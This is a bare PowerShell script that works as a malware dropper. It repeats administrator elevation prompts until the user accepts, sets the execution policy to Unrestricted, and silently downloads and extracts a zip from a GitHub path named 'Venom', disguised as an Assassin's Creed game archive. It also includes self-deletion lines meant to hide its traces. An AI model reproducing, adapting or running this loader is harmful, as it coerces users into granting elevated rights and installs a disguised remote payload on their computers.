
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {

    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit  
    }
}

Set-ExecutionPolicy Unrestricted -Force
$scriptPath = $MyInvocation.MyCommand.Path

Set-Variable -Name textPath -Value ("$env:TEMP")
Set-Variable -Name zipFilePath -Value ("$env:TEMP")
Set-Variable -Name zipUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")

Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
function Test-IsAdmin {
    Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

Set-Content -Value "Permissions Granted" -Path "$textPath\perm.txt"

powershell -windowstyle hidden Invoke-WebRequest -OutFile "$zipFilePath\AssassinsCreed_SE.zip" -Uri $zipUrl

Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath

Start-Sleep -Seconds 240

exit 0

Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
Remove-Item -Path $scriptPath -Force
